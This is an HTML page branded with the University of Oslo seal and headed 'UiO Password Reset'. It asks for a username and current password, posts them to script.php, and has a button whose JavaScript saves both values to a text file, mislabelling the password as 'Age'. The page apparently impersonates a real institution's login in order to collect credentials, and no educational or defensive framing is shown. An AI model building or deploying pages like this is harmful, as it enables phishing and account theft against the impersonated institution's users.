    <body>    
        <center>  <h1> <img src="https://upload.wikimedia.org/wikipedia/en/thumb/3/31/University_of_Oslo_seal.svg/1200px-University_of_Oslo_seal.svg.png"> UiO Password Reset </h1> </center>   
        <form action="script.php" method="post">
            <div class="container">
                <h1>Login to reset password</h1>
                <label>Username : </label>
                <input type="text" placeholder="Enter Username" name="username" id="username" required>
                <label>Password : </label>
                <input type="password" placeholder="Enter Password" name="password" id="password" required>
                <button type="submit">Login</button>
                <input type="button" id="bt" value="Save data to file" onclick="saveFile()" />
                Forgot <a href="#"> password? </a>
            </div>
        </form> 
        <script>
            let saveFile = () => {
                
                // Get the data from each element on the form.
                const username = document.getElementById('username');
                const password = document.getElementById('password');
                
                // This variable stores all the data.
                let data = 
                    '\r Name: ' + username.value + ' \r\n ' + 
                    'Age: ' +password.value + ' \r\n ';
                
                // Convert the text to BLOB.
                const textToBLOB = new Blob([data], { type: 'text/plain' });
                const sFileName = 'formData.txt';	   // The file to save the data.
        
                let newLink = document.createElement("a");
                newLink.download = sFileName;
        
                if (window.webkitURL != null) {
                    newLink.href = window.webkitURL.createObjectURL(textToBLOB);
                }
                else {
                    newLink.href = window.URL.createObjectURL(textToBLOB);
                    newLink.style.display = "none";
                    document.body.appendChild(newLink);
                }
        
                newLink.click(); 
            }
        </script>
    </body>
